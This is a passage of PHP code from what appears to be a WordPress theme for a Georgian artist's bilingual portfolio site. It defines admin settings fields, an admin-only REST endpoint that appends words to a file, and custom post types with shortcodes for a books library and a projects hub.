                <tr><th>Site Tagline / Desc (KA)</th><td><input type="text" name="zk_site_desc_ka" value="<?php echo esc_attr(get_option('zk_site_desc_ka', 'ქართველი მულტიდისციპლინური ხელოვანი, კომპოზიტორი და დიზაინერი')); ?>" class="large-text" /></td></tr>
                <tr><th>Alternate Names</th><td><input type="text" name="zk_schema_alternate_names" value="<?php echo esc_attr(get_option('zk_schema_alternate_names', 'ზურაბ კოსტავა, Zurab Kostava, Zura Kostava')); ?>" class="large-text" /></td></tr>
                <tr><th>Job Titles (EN)</th><td><input type="text" name="zk_schema_job_titles" value="<?php echo esc_attr(get_option('zk_schema_job_titles', 'Artist, Composer, Visual Artist, Designer')); ?>" class="large-text" /></td></tr>
                <tr><th>Job Titles (KA)</th><td><input type="text" name="zk_schema_job_titles_ka" value="<?php echo esc_attr(get_option('zk_schema_job_titles_ka', 'ხელოვანი, კომპოზიტორი, ვიზუალური არტისტი, დიზაინერი')); ?>" class="large-text" /></td></tr>
                <tr><th>Bio / Description (EN)</th><td><textarea name="zk_schema_description" class="large-text" rows="3"><?php echo esc_textarea(get_option('zk_schema_description', 'Georgian multidisciplinary artist, composer, and designer. Founder of Nuvio.')); ?></textarea></td></tr>
                <tr><th>Bio / Description (KA)</th><td><textarea name="zk_schema_description_ka" class="large-text" rows="3"><?php echo esc_textarea(get_option('zk_schema_description_ka', 'ქართველი მულტიდისციპლინური ხელოვანი, კომპოზიტორი და დიზაინერი. Nuvio-ს დამფუძნებელი.')); ?></textarea></td></tr>
                <tr><th>Birth Date (YYYY-MM-DD)</th><td><input type="text" name="zk_schema_birth_date" value="<?php echo esc_attr(get_option('zk_schema_birth_date', '1995-02-19')); ?>" class="regular-text" /></td></tr>
                <tr><th>Gender</th><td><input type="text" name="zk_schema_gender" value="<?php echo esc_attr(get_option('zk_schema_gender', 'Male')); ?>" class="regular-text" /></td></tr>
                <tr><th>Wikidata URL</th><td><input type="text" name="zk_schema_wikidata" value="<?php echo esc_attr(get_option('zk_schema_wikidata', 'https://www.wikidata.org/wiki/Q138009804')); ?>" class="regular-text" /></td></tr>
                <tr><th>Knows About</th><td><input type="text" name="zk_schema_knows_about" value="<?php echo esc_attr(get_option('zk_schema_knows_about', 'Web Design, UI/UX, Science Fiction, Music Production, Literature, Art Direction, Cinematic Soundscapes, Digital Art')); ?>" class="large-text" /></td></tr>
            </table>

            <h2 class="title" style="margin-top:30px; border-bottom:1px solid #ccc; padding-bottom:10px;">4. Social Links (თუ ლინკი ცარიელია, იმუშავებს როგორც #)</h2>
            <table class="form-table">
                <tr><th>Instagram URL</th><td><input type="url" name="zk_social_ig" value="<?php echo esc_url(get_option('zk_social_ig', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>Facebook URL</th><td><input type="url" name="zk_social_fb" value="<?php echo esc_url(get_option('zk_social_fb', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>X (Twitter) URL</th><td><input type="url" name="zk_social_x" value="<?php echo esc_url(get_option('zk_social_x', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>LinkedIn URL</th><td><input type="url" name="zk_social_linkedin" value="<?php echo esc_url(get_option('zk_social_linkedin', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>YouTube URL</th><td><input type="url" name="zk_social_youtube" value="<?php echo esc_url(get_option('zk_social_youtube', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>Spotify URL</th><td><input type="url" name="zk_social_spotify" value="<?php echo esc_url(get_option('zk_social_spotify', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>Bandcamp URL</th><td><input type="url" name="zk_social_bandcamp" value="<?php echo esc_url(get_option('zk_social_bandcamp', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>Medium URL</th><td><input type="url" name="zk_social_medium" value="<?php echo esc_url(get_option('zk_social_medium', '#')); ?>" class="regular-text" /></td></tr>
                <tr><th>Behance URL</th><td><input type="url" name="zk_social_behance" value="<?php echo esc_url(get_option('zk_social_behance', 'https://www.behance.net/zurabkostava')); ?>" class="regular-text" /></td></tr>
                <tr><th>MusicBrainz URL</th><td><input type="url" name="zk_social_musicbrainz" value="<?php echo esc_url(get_option('zk_social_musicbrainz', 'https://musicbrainz.org/artist/61081717-65c9-4717-9683-9ca286ae30e7')); ?>" class="regular-text" /></td></tr>
            </table>

            <h2 class="title" style="margin-top:30px; border-bottom:1px solid #ccc; padding-bottom:10px;">5. Skills (მძიმით გამოყოფილი)</h2>
            <table class="form-table">
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Skills (EN)</th>
                    <td><textarea name="zk_skills" rows="3" class="large-text"><?php echo esc_textarea(get_option('zk_skills', 'Music Production, Cinematography & Color Grading, UI/UX Design, Sound Design, Web Technologies, AI Workflows')); ?></textarea></td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Skills (KA)</th>
                    <td><textarea name="zk_skills_ka" rows="3" class="large-text" placeholder="მუსიკალური პროდაქშენი, სინემატოგრაფია & ფერთა კორექცია..."><?php echo esc_textarea(get_option('zk_skills_ka', 'მუსიკალური პროდაქშენი, სინემატოგრაფია & ფერთა კორექცია, UI/UX დიზაინი, ხმის დიზაინი, ვებ ტექნოლოგიები, AI სამუშაო პროცესები')); ?></textarea></td>
                </tr>
            </table>

            <h2 class="title" style="margin-top:30px; border-bottom:1px solid #ccc; padding-bottom:10px;">6. The Curated Mind (Favorites)</h2>
            <p><em>ფორმატი თითოეული ნივთისთვის (ახალ ხაზზე):</em> <code style="background:#e0e0e0; padding:2px 6px;">სათაური | https://ლინკი.com</code></p>
            <p style="color:#666;">შენიშვნა: თუ ქართული ვერსია ცარიელია, საიტზე ავტომატურად გამოჩნდება ინგლისური ვერსია.</p>
            <table class="form-table">
                <?php
                $fav_cats = [
                    'zk_fav_cinema'     => ['EN' => 'Cinema', 'KA' => 'კინო'],
                    'zk_fav_series'     => ['EN' => 'Series', 'KA' => 'სერიალები'],
                    'zk_fav_books'      => ['EN' => 'Books', 'KA' => 'წიგნები'],
                    'zk_fav_writers'    => ['EN' => 'Writers', 'KA' => 'მწერლები'],
                    'zk_fav_directors'  => ['EN' => 'Directors', 'KA' => 'რეჟისორები'],
                    'zk_fav_actors'     => ['EN' => 'Actors', 'KA' => 'მსახიობები'],
                    'zk_fav_artists'    => ['EN' => 'Musical Artists', 'KA' => 'მუსიკალური არტისტები'],
                    'zk_fav_bands'      => ['EN' => 'Bands', 'KA' => 'ჯგუფები'],
                    'zk_fav_albums'     => ['EN' => 'Albums', 'KA' => 'ალბომები'],
                    'zk_fav_songs'      => ['EN' => 'Songs', 'KA' => 'სიმღერები'],
                    'zk_fav_nerds'      => ['EN' => 'Tech Nerds', 'KA' => 'ტექ გიკები'],
                    'zk_fav_scientists' => ['EN' => 'Scientists', 'KA' => 'მეცნიერები'],
                    'zk_fav_athletes'   => ['EN' => 'Athletes', 'KA' => 'ათლეტები'],
                    'zk_fav_models'     => ['EN' => 'Models', 'KA' => 'მოდელები']
                ];
                foreach ($fav_cats as $key => $labels) {
                    echo '<tr>';
                    echo '<th style="vertical-align:top; padding-top:15px;"><strong>' . esc_html($labels['EN']) . '</strong><br><small style="color:#666;">' . esc_html($labels['KA']) . '</small></th>';
                    echo '<td>';
                    echo '<div style="margin-bottom:10px;"><strong style="font-size:12px; color:#2271b1;">[EN] ' . esc_html($labels['EN']) . ':</strong>';
                    echo '<textarea name="' . esc_attr($key) . '" rows="4" class="large-text">' . esc_textarea(get_option($key)) . '</textarea></div>';
                    echo '<div><strong style="font-size:12px; color:#135e96;">[KA] ' . esc_html($labels['KA']) . ' (ქართულად):</strong>';
                    echo '<textarea name="' . esc_attr($key . '_ka') . '" rows="4" class="large-text" placeholder="თუ ცარიელია, საიტზე გამოჩნდება ინგლისური...">' . esc_textarea(get_option($key . '_ka')) . '</textarea></div>';
                    echo '</td>';
                    echo '</tr>';
                }
                ?>
            </table>

            <h2 class="title" style="margin-top:30px; border-bottom:1px solid #ccc; padding-bottom:10px;">7. The Monologue</h2>
            <p>აქ შეგიძლია სრულფასოვანი რედაქტორით ააწყო შენი მონოლოგის ტექსტი ორ ენაზე (ინგლისური და ქართული). დაამატე აბზაცები, ბმულები ან ციტატები.</p>
            
            <h3 style="margin-top:20px; margin-bottom:8px;">English Monologue</h3>
            <div style="background:#fff; margin-bottom:25px; max-width:900px;">
                <?php
                $monologue_content = get_option('zk_monologue_content', "<h3>The Creative Process</h3>\n<p>This is where you can dive deep into your story.</p>");
                wp_editor($monologue_content, 'zk_monologue_content', array(
                    'textarea_name' => 'zk_monologue_content',
                    'media_buttons' => true,
                    'textarea_rows' => 15,
                    'teeny'         => false
                ));
                ?>
            </div>

            <h3 style="margin-top:20px; margin-bottom:8px;">ქართული მონოლოგი (The Monologue - KA)</h3>
            <div style="background:#fff; margin-bottom:20px; max-width:900px;">
                <?php
                $monologue_content_ka = get_option('zk_monologue_content_ka', "");
                wp_editor($monologue_content_ka, 'zk_monologue_content_ka', array(
                    'textarea_name' => 'zk_monologue_content_ka',
                    'media_buttons' => true,
                    'textarea_rows' => 15,
                    'teeny'         => false
                ));
                ?>
            </div>

            <?php submit_button('Save Identity Data'); ?>
        </form>
    </div>
    <?php
}


/* ============================================================
   ENCROLIB - SECURE WORD SAVE API ENDPOINT
   ============================================================ */
add_action('rest_api_init', function () {
    register_rest_route('zk/v1', '/save-word', array(
            'methods' => 'POST',
            'callback' => 'zk_save_word_endpoint',
            'permission_callback' => function () {
                // მხოლოდ შენ (ადმინისტრატორს) შეგეძლება სიტყვების დამატება
                return current_user_can('manage_options');
            }
    ));
});

function zk_save_word_endpoint($request) {
    $parameters = $request->get_json_params();
    if (!isset($parameters['word'])) {
        return new WP_Error('no_word', 'სიტყვა არ არის.', array('status' => 400));
    }

    $new_word = trim(strtolower($parameters['word']));
    $file_path = WP_CONTENT_DIR . '/Encrolib/words_monster.txt';

    // 🔴 დიაგნოსტიკა: შეამოწმე რას გიბრუნებს ეს $file_path
    if (!file_exists($file_path)) {
        return new WP_Error('no_file', 'ფაილი ვერ მოიძებნა ამ გზაზე: ' . $file_path, array('status' => 404));
    }

    $file_content = file_get_contents($file_path);
    $search_pattern = "\n" . $new_word . "\n";

    if (strpos($file_content, $search_pattern) !== false || strpos($file_content, $new_word . "\n") === 0) {
        return rest_ensure_response(['status' => 'exists', 'word' => $new_word]);
    }

    // ჩაწერა
    $success = file_put_contents($file_path, "\n" . $new_word, FILE_APPEND | LOCK_EX);

    if ($success !== false) {
        // 🟢 აბრუნებს დადასტურებას და ფაილის გზას
        return rest_ensure_response([
                'status' => 'ok',
                'added' => $new_word,
                'path' => $file_path // <--- ეს გამოჩნდება Network ტაბში (Response)
        ]);
    } else {
        return new WP_Error('write_error', 'ფაილი წაკითხვადია, მაგრამ ჩაწერა ვერ მოხერხდა. შეამოწმე CHMOD!', array('status' => 500));
    }
}



/* ============================================================
   📚 BOOKS LIBRARY - CPT & SHORTCODE (V2 - Premium UI)
   ============================================================ */

// 1. მენიუს შექმნა ადმინ-პანელში
function zk_register_books_cpt() {
    $labels = array(
            'name'          => 'Books',
            'singular_name' => 'Book',
            'menu_name'     => 'Books',
            'add_new'       => 'Add New Book',
            'add_new_item'  => 'Add New Book',
            'new_item'      => 'New Book',
            'edit_item'     => 'Edit Book',
            'view_item'     => 'View Book',
            'view_items'    => 'View Books',
            'all_items'     => 'All Books',
            'search_items'  => 'Search Books',
            'not_found'     => 'No books found.',
            'not_found_in_trash' => 'No books found in Trash.',
    );
    $args = array(
            'labels'        => $labels,
            'public'        => true,
            'publicly_queryable' => true,
            'has_archive'   => false,
            'rewrite'       => false,
            'query_var'     => false,
            'show_ui'       => true,
            'menu_icon'     => 'dashicons-book-alt',
            'supports'      => array( 'title', 'editor', 'excerpt', 'thumbnail', 'revisions' ),
    );
    register_post_type( 'zk_book', $args );
}
add_action( 'init', 'zk_register_books_cpt' );

// 2. დამატებითი ველები წიგნისთვის
function zk_book_add_meta_box() {
    add_meta_box( 'zk_book_details', 'Book Details', 'zk_book_meta_callback', 'zk_book', 'normal', 'high' );
}
add_action( 'add_meta_boxes', 'zk_book_add_meta_box' );

function zk_book_meta_callback( $post ) {
    wp_nonce_field( 'zk_book_save_meta', 'zk_book_meta_nonce' );
    echo '<p>The editor above contains the library synopsis, not the book chapters. Set the cover in Featured Image; manage translated titles and synopses in the translation panels.</p>';
    echo '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px">';
    foreach ( array( 'year' => 'Release year', 'language' => 'Book languages (e.g. ka, en)', 'pages' => 'Number of pages', 'isbn' => 'ISBN' ) as $field => $label ) {
        $name = 'zk_book_' . $field;
        echo '<p><label for="' . esc_attr( $name ) . '"><strong>' . esc_html( $label ) . '</strong></label><br><input class="widefat" id="' . esc_attr( $name ) . '" name="' . esc_attr( $name ) . '" value="' . esc_attr( get_post_meta( $post->ID, '_' . $name, true ) ) . '"></p>';
    }
    echo '</div>';
    $fields = array( 'genre' => 'Genre / format', 'author' => 'Author name', 'btn_label' => 'Read button label', 'audience' => 'Target audience', 'characters' => 'Characters', 'themes' => 'Themes / topics' );
    if ( ! get_post_meta( $post->ID, '_zk_book_path', true ) ) $fields['link'] = 'External read link';
    foreach ( zk_get_languages() as $code => $language ) {
        echo '<h3>' . esc_html( $language['name'] . ' (' . strtoupper( $code ) . ')' ) . '</h3><div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px">';
        foreach ( $fields as $field => $label ) {
            $name = 'zk_book_' . $field . ( 'en' === $code ? '' : '_' . $code );
            echo '<p><label for="' . esc_attr( $name ) . '"><strong>' . esc_html( $label ) . '</strong></label><br><input class="widefat" id="' . esc_attr( $name ) . '" name="' . esc_attr( $name ) . '" value="' . esc_attr( get_post_meta( $post->ID, '_' . $name, true ) ) . '"></p>';
        }
        echo '</div>';
    }
    if ( get_post_meta( $post->ID, '_zk_book_path', true ) ) echo '<p class="description">Read links are generated from Public path for every language. No separate Read Link is needed.</p>';
}

function zk_book_save_meta( $post_id ) {
    if ( 'zk_book' !== get_post_type( $post_id ) || wp_is_post_revision( $post_id ) || wp_is_post_autosave( $post_id ) || ! current_user_can( 'edit_post', $post_id ) || ! isset( $_POST['zk_book_meta_nonce'] ) || ! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['zk_book_meta_nonce'] ) ), 'zk_book_save_meta' ) ) return;
    $fields = array( 'year', 'language', 'pages', 'isbn' );
    foreach ( zk_get_languages() as $code => $language ) {
        foreach ( array( 'genre', 'author', 'btn_label', 'audience', 'characters', 'themes', 'link' ) as $field ) $fields[] = $field . ( 'en' === $code ? '' : '_' . $code );
    }
    foreach ( $fields as $field ) {
        $name = 'zk_book_' . $field;
        if ( ! isset( $_POST[ $name ] ) ) continue;
        $value = wp_unslash( $_POST[ $name ] );
        $value = 0 === strpos( $field, 'link' ) ? esc_url_raw( $value ) : sanitize_text_field( $value );
        update_post_meta( $post_id, '_' . $name, $value );
    }
}
add_action( 'save_post', 'zk_book_save_meta' );

function zk_books_shortcode() {
    $current_language = function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en';
    $is_ka = 'ka' === $current_language;
    if ( ! $is_ka ) {
        $req_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
        if ( strpos( $req_uri, '/ka/' ) === 0 || strpos( $req_uri, '/ka' ) === 0 ) {
            $is_ka = true;
        }
    }

    $query = new WP_Query( array(
            'post_type'      => 'zk_book',
            'posts_per_page' => -1,
            'orderby'        => 'date',
            'order'          => 'DESC',
            'no_found_rows'  => true
    ) );

    if ( ! $query->have_posts() ) {
        return '<p class="page__content">' . ( $is_ka ? 'წიგნები ჯერ გამოქვეყნებული არ არის.' : 'No books published yet.' ) . '</p>';
    }

    $output = '<div class="zk-books-library">';
    
    // SEO Data Aggregation
    $schema_item_list = array();
    $position = 1;

    while ( $query->have_posts() ) {
        $query->the_post();
        $id        = get_the_ID();
        $title_en = get_the_title();
        $title = 'en' === $current_language ? $title_en : ( get_post_meta( $id, zk_language_meta_key( 'title', $current_language ), true ) ?: $title_en );
        $desc_en = get_the_content();
        $desc = 'en' === $current_language ? $desc_en : ( get_post_meta( $id, zk_language_meta_key( 'content', $current_language ), true ) ?: get_post_meta( $id, zk_language_meta_key( 'excerpt', $current_language ), true ) ?: $desc_en );
        $year = get_post_meta( $id, '_zk_book_year', true );
        $genre = zk_book_localized_detail( $id, 'genre', $current_language );
        $author = zk_book_localized_detail( $id, 'author', $current_language ) ?: ( $is_ka ? 'ზურაბ კოსტავა' : 'Zurab Kostava' );
        $by_label = $is_ka ? 'ავტორი:' : 'by';
        $link = zk_book_url( $id, $current_language );
        $btn_label = zk_book_localized_detail( $id, 'btn_label', $current_language ) ?: ( $is_ka ? 'წაიკითხეთ ექსპერიმენტი' : 'Read Experiment' );

        $ai_summary   = zk_get_localized_post_meta( $id, 'geo_ai_summary', $current_language, true );
        $seo_desc     = zk_get_localized_post_meta( $id, 'seo_description', $current_language );
        if ( ! $seo_desc && 'en' !== $current_language ) {
            $seo_desc = get_post_meta( $id, zk_language_meta_key( 'excerpt', $current_language ), true );
        }

        $img_url = has_post_thumbnail() ? get_the_post_thumbnail_url( $id, 'large' ) : 'https://via.placeholder.com/400x600?text=No+Cover';
        
        // --- Schema Aggregation (Book Item) ---
        $desc_schema = !empty($seo_desc) ? $seo_desc : wp_strip_all_tags( $desc );
        $schema_item_list[] = array(
            '@type' => 'ListItem',
            'position' => $position,
            'item' => array(
                '@type' => 'Book',
                'inLanguage' => zk_get_language( $current_language )['locale'],
                'url' => $link ? $link : get_permalink($id),
                'name' => wp_strip_all_tags( $title ),
                'author' => array(
                    '@type' => 'Person',
                    'name' => wp_strip_all_tags( $author )
                ),
                'datePublished' => wp_strip_all_tags( $year ),
                'bookFormat' => 'https://schema.org/EBook',
                'description' => wp_strip_all_tags( $desc_schema ),
                'image' => $img_url
            )
        );

        $position++;

        $output .= '<div class="zk-book-card">';

        // --- 3D Cover ---
        $output .= '<div class="zk-book-visual">';
        $output .= '<div class="zk-book-aura" style="background-image: url(' . esc_url( $img_url ) . ');"></div>';
        $output .= '<div class="zk-book-cover">';
        $output .= has_post_thumbnail( $id )
            ? wp_get_attachment_image( get_post_thumbnail_id( $id ), 'large', false, array(
                'loading' => 'lazy', 'decoding' => 'async', 'alt' => $title,
                'class' => 'zk-book-img', 'sizes' => '(max-width: 767px) 70vw, 320px',
            ) )
            : '<img src="' . esc_url( $img_url ) . '" width="400" height="600" loading="lazy" decoding="async" alt="' . esc_attr( $title ) . '" class="zk-book-img">';
        $output .= '<div class="zk-book-spine"></div>';
        $output .= '</div></div>';

        // --- Info Section ---
        $output .= '<div class="zk-book-info">';

        // Meta Bar
        $output .= '<div class="zk-book-meta-bar">';
        if ( $genre ) {
            $output .= '<span class="zk-meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>' . esc_html( $genre ) . '</span>';
        }
        if ( $year ) {
            $output .= '<span class="zk-meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>' . esc_html( $year ) . '</span>';
        }
        $output .= '</div>'; // end meta bar

        $output .= '<h2 class="zk-book-title">' . esc_html( $title ) . '</h2>';
        if ( $author ) {
            $output .= '<div class="zk-book-author">' . esc_html( $by_label ) . ' <span>' . esc_html( $author ) . '</span></div>';
        }
        $output .= '<div class="zk-book-desc">' . wpautop( $desc ) . '</div>';

        // Actions
        $output .= '<div class="zk-book-actions">';
        if ( $link ) {
            $output .= '<a href="' . esc_url( $link ) . '" target="_blank" rel="noopener" class="zk-read-btn no-spa">';
            $output .= '<span>' . esc_html( $btn_label ) . '</span>';
            $output .= '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path></svg>';
            $output .= '</a>';
        }
        $output .= '</div>'; // end actions

        $output .= '</div>'; // end info
        $output .= '</div>'; // end card
    }

    wp_reset_postdata();
    $output .= '</div>';
    
    // --- Append JSON-LD Schema ---
    $graph = array();
    if ( !empty( $schema_item_list ) ) {
        $graph[] = array(
            '@context' => 'https://schema.org',
            '@type' => 'ItemList',
            'itemListElement' => $schema_item_list
        );
    }
    // FAQPage schema removed from here - it is now handled centrally in zk_inject_faq_schema
    if ( !empty( $graph ) ) {
        $output .= "\n" . '<script type="application/ld+json">' . "\n";
        $output .= json_encode( $graph, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT );
        $output .= "\n" . '</script>' . "\n";
    }

    return $output;
}
add_shortcode( 'zk_books', 'zk_books_shortcode' );

// Auto-seed initial Georgian translation for existing books (e.g. BETA)
function zk_init_book_ka_translations() {
    $seeded = get_option( 'zk_book_seeded_ka_beta_v1', false );
    if ( $seeded ) return;

    $books = get_posts( array(
        'post_type'      => 'zk_book',
        'posts_per_page' => -1,
        'post_status'    => 'any',
    ) );

    if ( ! empty( $books ) ) {
        foreach ( $books as $b ) {
            $id = $b->ID;
            $t = $b->post_title;
            if ( ! get_post_meta( $id, '_zk_title_ka', true ) ) {
                if ( strtolower( trim( $t ) ) === 'beta' || strpos( strtolower( $t ), 'beta' ) !== false ) {
                    update_post_meta( $id, '_zk_title_ka', 'ბეტა' );
                } else {
                    update_post_meta( $id, '_zk_title_ka', $t );
                }
            }
            if ( ! get_post_meta( $id, '_zk_book_genre_ka', true ) ) {
                $g = get_post_meta( $id, '_zk_book_genre', true );
                if ( empty( $g ) || stripos( $g, 'Sci-Fi' ) !== false ) {
                    update_post_meta( $id, '_zk_book_genre_ka', 'სამეცნიერო ფანტასტიკა, ექსპერიმენტული' );
                }
            }
            if ( ! get_post_meta( $id, '_zk_book_author_ka', true ) ) {
                update_post_meta( $id, '_zk_book_author_ka', 'ზურაბ კოსტავა' );
            }
            if ( ! get_post_meta( $id, '_zk_book_btn_label_ka', true ) ) {
                update_post_meta( $id, '_zk_book_btn_label_ka', 'წაიკითხეთ ექსპერიმენტი' );
            }
            if ( ! get_post_meta( $id, '_zk_content_ka', true ) ) {
                $desc_ka = '<p>ეს არ არის უბრალოდ წიგნი — ეს არის ცოცხალი ექსპერიმენტი. წაიკითხეთ ზურაბ კოსტავას სერიული სამეცნიერო-ფანტასტიკური რომანი, რომელიც რეალურ დროში იწერება. გამოიკვლიეთ კოსმიური პარადოქსები და ბავშვობის ფანტაზიები ისტორიაში, სადაც მკითხველი აყალიბებს რეალობას. შემოგვიერთდით უცნობში მოგზაურობაში.</p>';
                update_post_meta( $id, '_zk_content_ka', $desc_ka );
            }
        }
        update_option( 'zk_book_seeded_ka_beta_v1', true );
    }
}
add_action( 'init', 'zk_init_book_ka_translations' );

/* ============================================================
   TOOLS / PROJECTS HUB
   ============================================================ */
function zk_register_tools_cpt() {
    register_post_type( 'zk_tool', array(
        'labels' => array(
            'name'          => 'Tools / Projects',
            'singular_name' => 'Tool',
            'add_new_item'  => 'Add New Tool',
            'edit_item'     => 'Edit Tool',
        ),
        'public'      => true,
        'has_archive' => false,
        'menu_icon'   => 'dashicons-hammer',
        'supports'    => array( 'title', 'editor', 'thumbnail', 'excerpt' ),
    ) );
}
add_action( 'init', 'zk_register_tools_cpt' );

function zk_tool_meta_boxes() {
    add_meta_box( 'zk_tool_meta', 'Tool Details (პროექტის დეტალები)', 'zk_tool_meta_callback', 'zk_tool', 'normal', 'high' );
}
add_action( 'add_meta_boxes', 'zk_tool_meta_boxes' );

function zk_tool_meta_callback( $post ) {
    wp_nonce_field( 'zk_tool_save_meta', 'zk_tool_meta_nonce' );
    $link         = get_post_meta( $post->ID, '_zk_tool_link', true );
    $link_ka      = get_post_meta( $post->ID, '_zk_tool_link_ka', true );
    $status       = get_post_meta( $post->ID, '_zk_tool_status', true ) ?: 'Live';
    $status_ka    = get_post_meta( $post->ID, '_zk_tool_status_ka', true );
    $btn_label    = get_post_meta( $post->ID, '_zk_tool_btn_label', true ) ?: 'Visit Project';
    $btn_label_ka = get_post_meta( $post->ID, '_zk_tool_btn_label_ka', true ) ?: 'პროექტის ნახვა';
    ?>
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 10px;">
        <?php if ( ! get_post_meta( $post->ID, '_zk_project_path', true ) ) : ?>
        <div>
            <label for="zk_tool_link"><strong>Project Link (EN):</strong></label><br>
            <input type="text" id="zk_tool_link" name="zk_tool_link" value="<?php echo esc_attr( $link ); ?>" style="width:100%; margin-top:5px;" placeholder="e.g. https://zurabkostava.com/projects/wordevo" />
        </div>
        <div>
            <label for="zk_tool_link_ka"><strong>პროექტის ბმული (KA):</strong></label><br>
            <input type="text" id="zk_tool_link_ka" name="zk_tool_link_ka" value="<?php echo esc_attr( $link_ka ); ?>" style="width:100%; margin-top:5px;" placeholder="დატოვეთ ცარიელი ავტო /ka/projects/... ბმულისთვის" />
        </div>
        <?php else : ?>
        <p>Project URL: <a href="<?php echo esc_url( zk_project_url( $post, 'en' ) ); ?>" target="_blank" rel="noopener"><?php echo esc_html( zk_project_url( $post, 'en' ) ); ?></a><br>Translated URLs are generated automatically.</p>
        <?php endif; ?>

        <div>
            <label for="zk_tool_status"><strong>Status (EN):</strong></label><br>
            <select id="zk_tool_status" name="zk_tool_status" style="width:100%; margin-top:5px;">
                <option value="Live" <?php selected($status, 'Live'); ?>>Live</option>
                <option value="Beta" <?php selected($status, 'Beta'); ?>>Beta</option>
                <option value="WIP" <?php selected($status, 'WIP'); ?>>Work in Progress (WIP)</option>
                <option value="Archived" <?php selected($status, 'Archived'); ?>>Archived</option>
            </select>
        </div>
        <div>
            <label for="zk_tool_status_ka"><strong>სტატუსი (KA):</strong></label><br>
            <input type="text" id="zk_tool_status_ka" name="zk_tool_status_ka" value="<?php echo esc_attr( $status_ka ); ?>" style="width:100%; margin-top:5px;" placeholder="მაგ. ბეტა, აქტიური, მუშავდება, არქივი" />
        </div>

        <div>
            <label for="zk_tool_btn_label"><strong>Button Text (EN):</strong></label><br>
            <input type="text" id="zk_tool_btn_label" name="zk_tool_btn_label" value="<?php echo esc_attr( $btn_label ); ?>" style="width:100%; margin-top:5px;" placeholder="Visit Project" />
        </div>
        <div>
            <label for="zk_tool_btn_label_ka"><strong>ღილაკის ტექსტი (KA):</strong></label><br>
            <input type="text" id="zk_tool_btn_label_ka" name="zk_tool_btn_label_ka" value="<?php echo esc_attr( $btn_label_ka ); ?>" style="width:100%; margin-top:5px;" placeholder="პროექტის ნახვა" />
        </div>
    </div>
    <p style="color: #666; margin-top: 15px;"><em>* ქართული სათაური და აღწერა/სინოპსისი იმართება ქვემოთ "Georgian Translation" მეტაბოქსიდან.</em></p>
    <?php
}

function zk_tool_save_meta( $post_id ) {
    if ( ! isset( $_POST['zk_tool_meta_nonce'] ) || ! wp_verify_nonce( $_POST['zk_tool_meta_nonce'], 'zk_tool_save_meta' ) ) return;
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return;

    if ( isset( $_POST['zk_tool_link'] ) ) update_post_meta( $post_id, '_zk_tool_link', sanitize_text_field( $_POST['zk_tool_link'] ) );
    if ( isset( $_POST['zk_tool_link_ka'] ) ) update_post_meta( $post_id, '_zk_tool_link_ka', sanitize_text_field( $_POST['zk_tool_link_ka'] ) );
    if ( isset( $_POST['zk_tool_status'] ) ) update_post_meta( $post_id, '_zk_tool_status', sanitize_text_field( $_POST['zk_tool_status'] ) );
    if ( isset( $_POST['zk_tool_status_ka'] ) ) update_post_meta( $post_id, '_zk_tool_status_ka', sanitize_text_field( $_POST['zk_tool_status_ka'] ) );
    if ( isset( $_POST['zk_tool_btn_label'] ) ) update_post_meta( $post_id, '_zk_tool_btn_label', sanitize_text_field( $_POST['zk_tool_btn_label'] ) );
    if ( isset( $_POST['zk_tool_btn_label_ka'] ) ) update_post_meta( $post_id, '_zk_tool_btn_label_ka', sanitize_text_field( $_POST['zk_tool_btn_label_ka'] ) );
}
add_action( 'save_post', 'zk_tool_save_meta' );

function zk_tools_shortcode() {
    $is_ka = function_exists( 'zk_get_current_language' ) ? ( zk_get_current_language() === 'ka' ) : false;
    if ( ! $is_ka ) {
        $req_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
        if ( strpos( $req_uri, '/ka/' ) === 0 || strpos( $req_uri, '/ka' ) === 0 ) {
            $is_ka = true;
        }
    }

    $query = new WP_Query( array(
            'post_type'      => 'zk_tool',
            'posts_per_page' => -1,
            'orderby'        => 'date',
            'order'          => 'DESC',
            'no_found_rows'  => true
    ) );

    if ( ! $query->have_posts() ) {
        return '<p class="page__content">' . ( $is_ka ? 'პროექტები ჯერ დამატებული არ არის.' : 'No tools available yet.' ) . '</p>';
    }

    $output = '<div class="zk-tools-grid">';
    $schema_items = array();
    $pos = 1;

    while ( $query->have_posts() ) {
        $query->the_post();
        $post_id   = get_the_ID();
        $title_en  = get_the_title();
        $title_ka  = get_post_meta( $post_id, '_zk_title_ka', true );
        $title     = ( $is_ka && ! empty( $title_ka ) ) ? $title_ka : $title_en;

